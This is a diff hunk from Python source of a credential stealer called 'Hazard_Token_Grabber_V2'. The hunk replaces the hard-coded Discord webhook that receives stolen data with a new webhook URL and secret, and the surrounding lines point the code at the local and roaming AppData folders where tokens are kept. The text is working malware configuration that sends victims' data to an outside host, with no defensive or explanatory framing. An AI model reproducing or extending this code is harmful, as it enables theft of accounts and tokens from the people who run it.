@@ -49,7 +49,7 @@ except ImportError or NameError or ModuleNotFoundError:
     install('zipfile')
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/913834043232124948/Tvju08mCHTZBHM9ryr7e3eVsXg9R7OcpIb0Iz-5pJE_pnba_cOljv-7WtL_6F0z2DBdU"
+        self.webhook = "https://discord.com/api/webhooks/913114636935639051/JULTS369KJGCNpceCiH7V6YXgZj4f8nEkbb-uQDrhP-9-2T_CCbw1-kDLFYNCD37MtTa"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
